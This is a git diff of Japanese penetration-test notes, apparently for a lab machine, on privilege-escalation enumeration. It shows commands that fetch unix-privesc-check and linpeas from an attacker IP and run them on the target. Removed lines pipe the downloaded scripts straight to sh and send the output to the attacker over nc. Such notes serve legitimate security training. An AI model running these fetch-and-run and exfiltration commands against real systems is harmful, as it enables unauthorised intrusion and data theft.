@@ -15,23 +15,28 @@ stty raw -echo; fg
 - *curl は実行できない* (`budybox curl` でも不可)
 - port 8888へは接続できない
 
-## unix-privesc-check
-
+## unix-privesc-check -> 失敗
 ### 転送・実行
 
 ```zsh
 # Attacker
 cp /usr/bin/unix-privesc-check .
-python -m http.server 8888
-nc -lvnp 9002 | tee unix-privesc-check.out
+python -m http.server 443
 ```
 ```zsh
 # Target
-wget 192.168.45.215:443/unix-privesc-check | sh -s standard | nc -q 0 192.168.45.215 9002
+wget 192.168.45.215:443/unix-privesc-check 
+chmod +x unix-privesc-check
+./unix-privesc-check standard > unix-privesc-check.out
 ```
 
 ### 実行結果抽出
 
+```sh
+www-data@milan:/tmp$ cat unix-privesc-check.out 
+Assuming the OS is: linux
+ERROR: Dependend program 'strings' is mising.  Can't run.  Sorry!
+```
 
 ---
 
@@ -42,17 +47,20 @@ wget 192.168.45.215:443/unix-privesc-check | sh -s standard | nc -q 0 192.168.45
 ```zsh
 # Attacker
 cp /usr/share/peass/linpeas/linpeas.sh .
-python -m http.server 8888
-nc -lvnp 9002 | tee linpeas.out
+python -m http.server 443
 ```
 ```zsh
 # Target
-curl 192.168.45.215:8888/linpeas.sh | sh | nc -q 0 192.168.45.215 9002
+wget 192.168.45.215:443/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh | tee linpeas.out
 ```
 
 ### 実行結果抽出
 
-```powershell
+```sh
+
+-rw-r-----   1 root root   859 Nov 18  2022 froxlor
 
 ```
 
